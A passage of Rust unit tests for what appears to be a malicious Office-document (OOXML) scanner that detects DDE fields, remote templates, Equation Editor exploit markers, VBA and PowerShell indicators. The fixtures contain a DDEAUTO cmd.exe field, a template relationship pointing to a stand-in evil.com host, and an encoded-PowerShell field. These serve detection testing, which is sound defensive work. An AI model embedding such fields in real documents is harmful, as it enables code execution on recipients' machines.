            b"<w:instrText> DDEAUTO c:\\windows\\system32\\cmd.exe \" /k calc\" </w:instrText>";
        let zip = build_zip_stored("word/document.xml", content);
        let report = analyze_ooxml(&zip).unwrap();
        assert!(report.has_dde);
        assert!(!report.dde_fields.is_empty());
    }

    #[test]
    fn test_analyze_ooxml_no_dde() {
        let content =
            b"<w:document><w:body><w:p><w:r><w:t>Hello</w:t></w:r></w:p></w:body></w:document>";
        let zip = build_zip_stored("word/document.xml", content);
        let report = analyze_ooxml(&zip).unwrap();
        assert!(!report.has_dde);
    }

    #[test]
    fn test_analyze_ooxml_external_template() {
        let rels = br#"<?xml version="1.0"?><Relationships xmlns="..."><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.com/template.dotm"/></Relationships>"#;
        let zip = build_zip_stored("word/_rels/settings.xml.rels", rels);
        let report = analyze_ooxml(&zip).unwrap();
        assert!(report.has_external_template);
        assert!(report.external_template_url.is_some());
    }

    #[test]
    fn test_analyze_ooxml_equation_editor_guid() {
        let content = b"<o:OLEObject ProgID=\"Equation.3\" r:id=\"rId1\" ObjectID=\"_1\" Type=\"Embed\" DrawAspect=\"Content\" Require=\"false\" CLSID=\"{0002CE02-0000-0000-C000-000000000046}\"/>";
        let zip = build_zip_stored("word/document.xml", content);
        let report = analyze_ooxml(&zip).unwrap();
        assert!(report.has_equation_editor_cve);
    }

    #[test]
    fn test_analyze_ooxml_equation_editor_progid() {
        let content = b"<o:OLEObject ProgID=\"Equation.3\"/>";
        let zip = build_zip_stored("word/document.xml", content);
        let report = analyze_ooxml(&zip).unwrap();
        assert!(report.has_equation_editor_cve);
    }

    #[test]
    fn test_analyze_ooxml_suspicious_powershell() {
        let content = b"<w:instrText>powershell -enc AAABBB</w:instrText>";
        let zip = build_zip_stored("xl/worksheets/sheet1.xml", content);
        let report = analyze_ooxml(&zip).unwrap();
        assert!(
            report
                .macro_iocs
                .iter()
                .any(|i| i.to_ascii_lowercase().contains("powershell"))
        );
    }

    #[test]
    fn test_ooxml_report_risk_score_clean() {
        let r = OoxmlReport::default();
        assert_eq!(r.risk_score(), 0);
    }

    #[test]
    fn test_ooxml_report_risk_score_vba() {
        let r = OoxmlReport {
            has_vba: true,
            ..OoxmlReport::default()
        };
        assert!(r.risk_score() >= 40);
    }

    #[test]
    fn test_ooxml_report_risk_score_capped() {
        let r = OoxmlReport {
            has_vba: true,
            has_external_template: true,
            has_dde: true,
            has_equation_editor_cve: true,
            ..OoxmlReport::default()
        };
        assert_eq!(r.risk_score(), 100);
    }

    #[test]
    fn test_ooxml_report_is_suspicious_false() {
        assert!(!OoxmlReport::default().is_suspicious());
    }

    #[test]
    fn test_ooxml_report_is_suspicious_vba() {
        let r = OoxmlReport {
            has_vba: true,
            ..OoxmlReport::default()
        };
        assert!(r.is_suspicious());
    }

    #[test]
    fn test_ooxml_report_all_iocs() {
        let r = OoxmlReport {
            external_template_url: Some("http://evil.com".into()),
            dde_fields: vec!["DDEAUTO cmd".into()],
            ole_objects: vec!["package".into()],
            macro_iocs: vec!["Shell".into()],
            has_external_template: true,
            has_dde: true,
            ..OoxmlReport::default()
        };
        let iocs = r.all_iocs();
        assert!(iocs.iter().any(|i| i.contains("evil.com")));
        assert!(iocs.iter().any(|i| i.contains("DDEAUTO")));
        assert!(iocs.iter().any(|i| i.contains("package")));
    }

    #[test]
    fn test_ooxml_report_display() {
        let r = OoxmlReport {
            file_size: 1024,
            ..OoxmlReport::default()
        };
        assert!(r.to_string().contains("1024"));
    }

    #[test]
    fn test_extract_xml_attr_double_quote() {
        let tag = r#"<Relationship Target="http://evil.com/x.dotm" Type="foo"/>"#;
        let val = extract_xml_attr(tag, "Target").unwrap();
        assert_eq!(val, "http://evil.com/x.dotm");
    }

    #[test]
    fn test_extract_xml_attr_single_quote() {
        let tag = "<Relationship Target='foo.bin'/>";
        let val = extract_xml_attr(tag, "Target").unwrap();
        assert_eq!(val, "foo.bin");
    }

    #[test]
    fn test_extract_xml_attr_missing() {
        let tag = "<Foo Bar=\"baz\"/>";
        assert!(extract_xml_attr(tag, "Target").is_none());
    }

    #[test]
    fn test_zip_entry_names_multiple() {
        // Build a multi-file ZIP by concatenating two single-entry ZIPs.
        // For now just test that an empty ZIP produces empty entries.
        let result = parse_zip_entries(b"");
        assert!(result.is_empty());
    }

    #[test]
    fn test_analyze_ooxml_file_size_recorded() {
        let zip = build_zip_stored("x.xml", b"hello");
        let len = zip.len();
        let report = analyze_ooxml(&zip).unwrap();
        assert_eq!(report.file_size, len);
    }

    #[test]
    fn test_analyze_ooxml_ole_in_rels() {
        let rels = br#"<Relationships><Relationship Id="rId2" Type=".../oleObject" Target="embeddings/oleObject1.bin"/></Relationships>"#;
        let zip = build_zip_stored("word/_rels/document.xml.rels", rels);
        let report = analyze_ooxml(&zip).unwrap();
        // may or may not detect depending on line scanning; just ensure no panic
        let _ = report;
    }
}
